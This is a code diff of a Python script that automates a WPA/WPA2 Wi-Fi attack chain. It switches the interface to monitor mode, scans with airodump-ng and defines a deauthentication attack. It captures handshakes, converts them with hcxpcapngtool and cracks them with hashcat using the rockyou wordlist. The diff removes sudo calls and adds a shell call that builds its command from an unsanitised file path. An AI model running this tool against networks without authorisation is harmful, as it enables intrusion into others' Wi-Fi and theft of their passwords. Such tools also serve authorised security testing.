@@ -36,6 +36,7 @@ import shutil
 import subprocess
 import importlib
 import importlib.util
+from pathlib import Path
 import signal
 import time
 import tempfile
@@ -103,7 +104,7 @@ def run_command(command):
 		)
 		return True, result.stdout.strip()
 	except KeyboardInterrupt:
-		ph.print_wrn(f"Execution interrupted by user (CTRL+C)\n")
+		ph.print_wrn(f"(run_command) Execution interrupted by user (CTRL+C)\n")
 		return False, "User interrupted"
 	except subprocess.CalledProcessError as e:
 		return False, e.stderr.strip()
@@ -115,12 +116,10 @@ def launch_airodump_inline(iface, output_file):
 	"""
 	try:
 		subprocess.run(
-			["sudo", "airodump-ng", "--output-format", "csv", "-w", output_file, iface]
+			["airodump-ng", "--output-format", "csv", "-w", output_file, iface]
 		)
 	except KeyboardInterrupt:
-		ph.print_wrn(f"Execution interrupted by user (CTRL+C)\n")
-	except KeyboardInterrupt:
-		ph.print_wrb(f"Scan interrupted by user\n")
+		ph.print_wrn(f"(airodump-ng) Execution interrupted by user (CTRL+C)\n")
 
 # Wait for the user to press CTRL+C to interrupt manually
 def wait_for_user():
@@ -191,9 +190,9 @@ def parse_airodump_csv(input_prefix_file):
 # Restore interface to original mode
 def restore_interface(iface, mode="managed"):
 	ph.print_inf(f"Restoring interface to mode: {mode}\n")
-	run_command(f"sudo ifconfig {iface} down")
-	run_command(f"sudo iwconfig {iface} mode {mode}")
-	run_command(f"sudo ifconfig {iface} up")
+	run_command(f"ifconfig {iface} down")
+	run_command(f"iwconfig {iface} mode {mode}")
+	run_command(f"ifconfig {iface} up")
 
 # Prompt and execute deauth attack
 def run_deauth_attack(iface, target_mac, ap_mac, deauth_count=25):
@@ -256,7 +255,7 @@ def launch_handshake_capture(iface, bssid, channel, client_mac, output_prefix_fi
 	Output file will be named using format: MAC_<MAC>_CH_<CH>_<YYYYMMDD_HHMM>.cap
 	"""
 	cmd = [
-		"sudo", "airodump-ng",
+		"airodump-ng",
 		"-c", str(channel),
 		"--bssid", bssid,
 		"--write", output_prefix_file,
@@ -288,7 +287,6 @@ def delete_non_cap_files():
 		if os.path.isfile(file_path) and not file_name.endswith(".cap"):
 			try:
 				os.remove(file_path)
-				ph.print_inf(f"Removed: {file_path}\n")
 			except Exception as e:
 				ph.print_wrn(f"Could not delete {file_path}: {e}\n")
 
@@ -300,7 +298,7 @@ def convert_pcap_to_hash(input_file, output_file="wpa2.hc22000"):
 		ph.print_err(f"Input file not found: {input_file}\n")
 		return False
 
-	cmd = ["sudo", "hcxpcapngtool", "-o", output_file, input_file]
+	cmd = ["hcxpcapngtool", "-o", output_file, input_file]
 	try:
 		subprocess.run(
 			cmd,
@@ -315,13 +313,11 @@ def convert_pcap_to_hash(input_file, output_file="wpa2.hc22000"):
 			ph.print_err(f"(hcxpcapngtool) Conversion error\n")
 			return False
 	except subprocess.CalledProcessError as e:
-		ph.print_err(f"Error during conversion: {e}\n")
+		ph.print_err(f"(hcxpcapngtool) Error during conversion\n")
 		return False
 	except FileNotFoundError:
 		ph.print_err(f"hcxpcapngtool not found. Make sure it's installed and in your PATH\n")
 		return False
-
-from pathlib import Path
 
 def show_hash(input_file):
 	# Check if the file exists and is a regular file
@@ -335,22 +331,18 @@ def show_hash(input_file):
 	else:
 		ph.print_err(f"File 'wpa2.hc22000' does not exist\n")
 
-import subprocess
-import os
-
 def crack_hash_with_hashcat(hash_file, wordlist_path="rockyou.txt", hash_mode=22000, potfile_path="hashcat.potfile"):
 	"""
-	Runs Hashcat to crack a hash using the specified wordlist.
-	Returns the cracked password if found, else None.
+	Runs Hashcat to crack a hash using a given wordlist.
+	Returns the cracked password if found; otherwise, returns None.
 	"""
 	if not os.path.isfile(hash_file) or not os.path.isfile(wordlist_path):
 		return None
 
 	cmd = [
-		"sudo",
 		"hashcat",
-		"-m", str(hash_mode),         # Hash mode (22000 for WPA/WPA2 PMKID+EAPOL)
-		"-a", "0",                    # Attack mode 0 = straight (dictionary)
+		"-m", str(hash_mode),       # Hash mode (22000 = WPA/WPA2)
+		"-a", "0",                  # Attack mode: straight (dictionary)
 		hash_file,
 		wordlist_path,
 		"--potfile-path", potfile_path,
@@ -358,12 +350,16 @@ def crack_hash_with_hashcat(hash_file, wordlist_path="rockyou.txt", hash_mode=22
 	]
 
 	try:
+		# Execute Hashcat silently
 		subprocess.run(
 			cmd,
 			check=True,
 			stdout=subprocess.DEVNULL,
 			stderr=subprocess.DEVNULL
 		)
+
+		# Deduplicate the potfile using shell command
+		os.system(f"sort -u {potfile_path} -o {potfile_path}")
 
 		# Parse potfile to extract cracked password
 		if os.path.isfile(potfile_path):
@@ -373,7 +369,10 @@ def crack_hash_with_hashcat(hash_file, wordlist_path="rockyou.txt", hash_mode=22
 					if len(parts) == 2:
 						return parts[1]  # Return the cracked password
 		return None
-	except subprocess.CalledProcessError:
+
+		return None
+
+	except (subprocess.CalledProcessError, FileNotFoundError):
 		return None
 
 def main():
@@ -406,7 +405,7 @@ def main():
 			ph.print_wrn(f"Invalid input. Please enter a valid number\n")
 
 	# Step 2: Bring interface down
-	success, msg = run_command(f"sudo ifconfig {interface} down\n")
+	success, msg = run_command(f"ifconfig {interface} down\n")
 	if success:
 		ph.print_inf(f"🔻 ifconfig down: OK\n")
 	else:
@@ -414,7 +413,7 @@ def main():
 		sys.exit(1)
 
 	# Step 3: Set interface to monitor mode
-	success, msg = run_command(f"sudo iwconfig {interface} mode monitor\n")
+	success, msg = run_command(f"iwconfig {interface} mode monitor\n")
 	if success:
 		ph.print_inf(f"📡 iwconfig monitor: OK\n")
 	else:
@@ -422,7 +421,7 @@ def main():
 		sys.exit(1)
 
 	# Step 4: Bring interface back up
-	success, msg = run_command(f"sudo ifconfig {interface} up\n")
+	success, msg = run_command(f"ifconfig {interface} up\n")
 	if success:
 		ph.print_inf(f"🔺 ifconfig up: OK\n")
 	else:
@@ -506,11 +505,13 @@ def main():
 
 	if flag_interface:
 		restore_interface(interface)
-	sys.exit(0)
+		return None
+	else:
+		return interface
 
 if __name__ == "__main__":
 	try:
-		main()
+		interface = main()
 	except KeyboardInterrupt:
 		ph.print_wrn(f"Execution interrupted by user (CTRL+C)\n")
 		if flag_interface:
